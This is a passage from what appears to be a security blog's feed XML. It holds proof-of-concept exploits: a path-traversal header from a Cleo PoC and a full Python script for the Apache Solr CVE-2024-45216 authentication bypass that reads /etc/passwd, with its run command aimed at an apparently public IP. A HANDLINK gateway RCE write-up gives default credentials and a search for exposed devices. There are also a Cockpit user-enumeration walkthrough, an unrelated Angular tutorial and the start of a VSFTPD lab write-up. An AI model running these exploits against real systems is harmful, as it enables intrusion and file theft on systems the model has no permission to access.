class="string">&#x27;kZ4jVQ4uZtITYtnweSsVDUEwZ2ltraTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Priority&#x27;</span>: <span class="string">&#x27;u=4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Retrieve&#x27;</span>: <span class="string">&#x27;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.get(f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>, cookies=cookies, headers=headers,<span class="built_in">timeout</span>=5)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&#x27;************************ &#123;len(response.text)&#125; ************************\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;HTTP 错误: &#123;http_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;连接错误: &#123;conn_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求超时: &#123;timeout_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求错误: &#123;req_err&#125;&quot;</span>)          </span><br></pre></td></tr></table></figure>The following code demonstrates how to execute the script:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://192.168.0.1:8983</span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;Description

    Cleo has identified an unrestricted file upload and download vulnerability (CVE-2024-50623) that could lead to r</summary>
      
    
    
    
    <category term="vulnerability" scheme="http://example.com/categories/vulnerability/"/>
    
    <category term="Cleo Harmony" scheme="http://example.com/categories/vulnerability/Cleo-Harmony/"/>
    
    <category term="CVE-2024-50623" scheme="http://example.com/categories/vulnerability/Cleo-Harmony/CVE-2024-50623/"/>
    
    
    <category term="CVE-2024-50623" scheme="http://example.com/tags/CVE-2024-50623/"/>
    
  </entry>
  
  <entry>
    <title>Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 ) poc</title>
    <link href="http://example.com/2024/12/01/vuln-CVE-2024-45216/"/>
    <id>http://example.com/2024/12/01/vuln-CVE-2024-45216/</id>
    <published>2024-12-01T21:19:57.000Z</published>
    <updated>2024-12-01T22:33:35.642Z</updated>
    
    <content type="html"><![CDATA[<pre><code>Description    An Improper Authentication vulnerability exists in Apache Solr, affecting versions:        From 5.3.0 to versions before 8.11.4            From 9.0.0 to versions before 9.7.0    This vulnerability occurs when the PKIAuthenticationPlugin (enabled by default with Solr Authentication) allows for an authentication bypass. By appending a &quot;fake ending&quot; to the end of a Solr API URL path, malicious requests can bypass authentication. The fake path resembles an unprotected API endpoint, but it is stripped internally after authentication and before API routing, maintaining the appearance of a valid API URL.Impact    This vulnerability allows unauthorized access to sensitive Solr APIs, potentially compromising system integrity and exposing data.Solution    Users should upgrade to:        Version 9.7.0 (for 9.x series)        Version 8.11.4 (for 8.x series)    These versions address and fix the issue.Proof of Concept (Python Code)        <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 )</span></span><br><span class="line"><span class="comment"># Date : 2024-12-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/solr/admin/cores:/admin/info/key?indexInfo=false&amp;wt=json&#x27;</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;/solr/&#123;&#125;/config:/admin/info/key&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;/solr/&#123;&#125;/debug/dump:/admin/info/key?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:8983</span></span><br><span class="line">host = args.host</span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line">headers1 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params1 = &#123;</span><br><span class="line">    <span class="string">&#x27;indexInfo&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wt&#x27;</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers2 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers3 = &#123;</span><br><span class="line"><span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;set-property&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;requestDispatcher.requestParsers.enableRemoteStreaming&#x27;</span>: True,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.post(</span><br><span class="line">        f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>,</span><br><span class="line">        params=params1,</span><br><span class="line">        headers=headers1,</span><br><span class="line">        <span class="built_in">timeout</span>=10</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200 and <span class="string">&quot;application/json&quot;</span> <span class="keyword">in</span> response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;&#123;host&#125; ---&gt; &#123;len(response.text)&#125; \n\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> + <span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        data1 = None</span><br><span class="line">        data1 = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data1 != None:</span><br><span class="line"></span><br><span class="line">            status_data = data1.get(<span class="string">&quot;status&quot;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> core_name, core_details <span class="keyword">in</span> status_data.items():</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Core Name: &#123;core_name&#125;&quot;</span>)</span><br><span class="line">                temp_url = url1.format(core_name)</span><br><span class="line"></span><br><span class="line">                response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2, json=json_data,<span class="built_in">timeout</span>=10)                    </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> response.status_code == 200 and len(response.text) &lt; 200:</span><br><span class="line">                    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(response.text)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> +<span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)                        </span><br><span class="line"></span><br><span class="line">                    temp_url = url2.format(core_name)</span><br><span class="line"></span><br><span class="line">                    response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2,<span class="built_in">timeout</span>=10)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">                        </span><br><span class="line">                        <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(response.text)                        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;HTTP 错误: &#123;http_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;连接错误: &#123;conn_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求超时: &#123;timeout_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求错误: &#123;req_err&#125;&quot;) </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>The following code demonstrates how to execute the script:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://122.51.176.242:8983</span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre&gt;&lt;code&gt;Description
    An Improper Authentication vulnerability exists in Apache Solr, affecting versions:

        From 5.3.0 to versio</summary>
      
    
    
    
    <category term="vulnerability" scheme="http://example.com/categories/vulnerability/"/>
    
    <category term="Apache Solr" scheme="http://example.com/categories/vulnerability/Apache-Solr/"/>
    
    <category term="CVE-2024-45216" scheme="http://example.com/categories/vulnerability/Apache-Solr/CVE-2024-45216/"/>
    
    
    <category term="CVE-2024-45216" scheme="http://example.com/tags/CVE-2024-45216/"/>
    
  </entry>
  
  <entry>
    <title>HANDLINK-ISS-7000v2 Gateway login_handler.cgi Unauthorized RCE Vulnerability</title>
    <link href="http://example.com/2024/11/12/vuln-handlink/"/>
    <id>http://example.com/2024/11/12/vuln-handlink/</id>
    <published>2024-11-12T20:03:16.000Z</published>
    <updated>2024-11-13T02:15:30.953Z</updated>
    
    <content type="html"><![CDATA[<p>The HANDLINK-ISS-7000 v2 network gateway server, manufactured by Taiwan Hanlin Technology Co., Ltd., is a high-performance gateway solution designed for network authentication and billing in various hospitality settings.</p><p>A command execution vulnerability exists in ISS-7000 v2’s firmware versions 1.00.06 and 1.00.08, allowing attackers to obtain server privileges.</p><p>Vulnerability Reproduction Steps</p><ol><li>Device Discovery: Using the FOFA search engine, I searched for accessible HANDLINK-ISS-7000 v2 devices. The search yielded approximately 106 results.</li></ol><p>   <img src="/images/HANDLINK1.jpg"> </p><ol start="2"><li>Accessing the Login Interface: I opened &#x2F;login_handler.cgi in Burp Suite’s browser and used the Forward button. For login, I entered the following credentials:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 1111111111</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>   <img src="/images/HANDLINK2.jpg"></p><ol start="3"><li>Intercepting and Modifying the Request: Burp Suite captured the request, which appeared as shown below:</li></ol><p>   <img src="/images/HANDLINK3.jpg"> </p><ol start="4"><li>Executing the Exploit: After modifying the intercepted package and sending the request, I gained root-level access to the server.</li></ol><p>   <img src="/images/HANDLINK4.jpg"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;The HANDLINK-ISS-7000 v2 network gateway server, manufactured by Taiwan Hanlin Technology Co., Ltd., is a high-performance gateway soluti</summary>
      
    
    
    
    <category term="vulnerability" scheme="http://example.com/categories/vulnerability/"/>
    
    <category term="HANDLINK-ISS-7000v2" scheme="http://example.com/categories/vulnerability/HANDLINK-ISS-7000v2/"/>
    
    <category term="gate" scheme="http://example.com/categories/vulnerability/HANDLINK-ISS-7000v2/gate/"/>
    
    
    <category term="Burp Suite" scheme="http://example.com/tags/Burp-Suite/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>The Cockpit system has an arbitrary user enumeration vulnerability</title>
    <link href="http://example.com/2024/11/10/vuln-cockpit/"/>
    <id>http://example.com/2024/11/10/vuln-cockpit/</id>
    <published>2024-11-11T03:37:33.000Z</published>
    <updated>2024-11-11T14:14:50.196Z</updated>
    
    <content type="html"><![CDATA[<p>Using Burp Suite’s browser, open the URL: <a href="https://192.168.1.10/auth/forgotpassword">https://192.168.1.10/auth/forgotpassword</a>. Burp Suite will capture the request packet. Click the “Forward” button, and the screen should look like this:</p><p><img src="/images/vuln1.jpg"> </p><p>Next, enter a username, such as admin, and click the “RESET” button. Burp Suite will capture another packet, which can be sent to the Repeater. It should appear as follows:</p><p><img src="/images/vuln5.jpg"> </p><p>Click the “Send” button in Burp Suite’s Repeater, and you’ll see the response:</p><p><img src="/images/vuln8.jpg"> </p><p>The response shows the following error message: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>:<span class="string">&quot;Invalid address: (from) root@localhost&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This indicates that the username admin exists. However, if you input a username that doesn’t exist, you’ll see the following response:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>:<span class="string">&quot;User does not exist&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In Burp Suite’s Repeater, the response appears as follows:</p><p><img src="/images/vuln9.jpg"> </p><p>From this, we can deduce that the user admin exists, while admin11111 does not. Using Burp Suite’s Intruder, we can attempt to enumerate other usernames. </p><p><img src="/images/vuln10.jpg"> </p><p>The results show that the following usernames exist:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">chen</span><br><span class="line">max</span><br><span class="line">user</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Using Burp Suite’s browser, open the URL: &lt;a href=&quot;https://192.168.1.10/auth/forgotpassword&quot;&gt;https://192.168.1.10/auth/forgotpassword&lt;/a&gt;</summary>
      
    
    
    
    <category term="vulnerability" scheme="http://example.com/categories/vulnerability/"/>
    
    <category term="Cockpit" scheme="http://example.com/categories/vulnerability/Cockpit/"/>
    
    
    <category term="Burp Suite" scheme="http://example.com/tags/Burp-Suite/"/>
    
    <category term="user enumeration vulnerability" scheme="http://example.com/tags/user-enumeration-vulnerability/"/>
    
  </entry>
  
  <entry>
    <title>Angular from Beginner to Hero (1) -- Setting up the Local Environment and Workspace</title>
    <link href="http://example.com/2022/06/18/angular-start/"/>
    <id>http://example.com/2022/06/18/angular-start/</id>
    <published>2022-06-19T01:07:20.000Z</published>
    <updated>2023-10-19T20:31:51.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h1><p>  To use the Angular framework, you should be familiar with the following:<br>   – JavaScript<br>   – HTML<br>   – CSS<br>  Knowledge of TypeScript is helpful, but not required.</p><p>  To install Angular on your local system, you need the following:</p><ol><li>Node.js:<br>Angular requires an active LTS or maintenance LTS version of Node.js.<br>Here’s the newest version in nodejs.org&#x2F;en:<br><img src="/images/nodejs.jpg"><br>If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">v16.17.1</span><br></pre></td></tr></table></figure></li><li>npm Package Manager:<br>Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window.</li></ol><h1 id="Install-the-Angular-CLI"><a href="#Install-the-Angular-CLI" class="headerlink" title="Install the Angular CLI"></a>Install the Angular CLI</h1><p>  To install the Angular CLI, open a terminal window and run the following command:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @angular/cli</span><br></pre></td></tr></table></figure></p><h1 id="Create-a-workspace-and-initial-application"><a href="#Create-a-workspace-and-initial-application" class="headerlink" title="Create a workspace and initial application"></a>Create a workspace and initial application</h1><p>  You develop apps in the context of an Angular workspace.</p><p>  To create a new workspace and initial starter app:<br>    1. Run the CLI command ng new and provide the name my-app, as shown here:<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng new my-app</span><br></pre></td></tr></table></figure><br>    2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key.</p><p>  The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes.</p><p>  The CLI creates a new workspace and a simple Welcome app, ready to run.</p><h1 id="Run-the-application"><a href="#Run-the-application" class="headerlink" title="Run the application"></a>Run the application</h1><p>  The Angular CLI includes a server, for you to build and serve your app locally.</p><ol><li>Navigate to the workspace folder, such as my-app.</li><li>Run the following command:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> my-app</span><br><span class="line">ng serve --open</span><br></pre></td></tr></table></figure>  The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files.<br>  The –open (or just -o) option automatically opens your browser to <a href="http://localhost:4200/">http://localhost:4200/</a>.</li></ol><p>  If your installation and setup was successful, you should see a page similar to the following.</p><p>  <img src="/images/app-works.png"> </p><h1 id="Compile-and-Package"><a href="#Compile-and-Package" class="headerlink" title="Compile and Package"></a>Compile and Package</h1><p>  Angular CLI also provides commands:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng build --prod</span><br></pre></td></tr></table></figure><br>  Among them, the parameter –prod tells the compilation environment to compile for the production environment package.</p><p>  Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows.<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;configurations&quot;</span>: &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="string">&quot;budgets&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;initial&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;5mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;10mb&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;anyComponentStyle&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumWarning&quot;</span>: <span class="string">&quot;1mb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;maximumError&quot;</span>: <span class="string">&quot;4mb&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">       ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files.</p><h1 id="Deploy-to-a-Server"><a href="#Deploy-to-a-Server" class="headerlink" title="Deploy to a Server"></a>Deploy to a Server</h1><ol><li><p>Using the “phpStudy” tool, go into its root directory, which is usually something like “C:\phpStudy\PHPTutorial\WWW.”</p></li><li><p>Copy all the files from the ‘dist’ directory to the root directory “C:\phpStudy\PHPTutorial\WWW.”</p></li><li><p>Restart phpStudy’s services to make sure the changes take effect.</p></li><li><p>Open your Chrome browser, and you should be able to access the website by entering the following URL in the address bar: <a href="http://localhost/index.html">http://localhost/index.html</a></p></li></ol><p>  Make sure you have the correct directory paths, and that the files from the ‘dist’ directory are copied over to the correct location in the root directory. Additionally, ensure that the web server and PHP services in phpStudy are correctly configured and running.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prerequisites&quot;&gt;&lt;a href=&quot;#Prerequisites&quot; class=&quot;headerlink&quot; title=&quot;Prerequisites&quot;&gt;&lt;/a&gt;Prerequisites&lt;/h1&gt;&lt;p&gt;  To use the Angular frame</summary>
      
    
    
    
    <category term="Angular from Beginner to Hero" scheme="http://example.com/categories/Angular-from-Beginner-to-Hero/"/>
    
    <category term="(1) Setting up the Local Environment and Workspace" scheme="http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"/>
    
    
  </entry>
  
  <entry>
    <title>VSFTPD 2.3.4 exploit</title>
    <link href="http://example.com/2021/03/05/VSFTPD2-3-4pentest/"/>
    <id>http://example.com/2021/03/05/VSFTPD2-3-4pentest/</id>
    <published>2021-03-06T02:42:06.000Z</published>
    <updated>2024-01-05T22:20:45.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC"><a href="#metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC" class="headerlink" title="[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC"></a>[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC</h1><ol><li>Network Scan</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# nmap -A -sV 192.168.244.136</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 15:58 EST</span><br><span class="line">Nmap scan report for 192.168.244.136 (192.168.244.136)</span><br><span 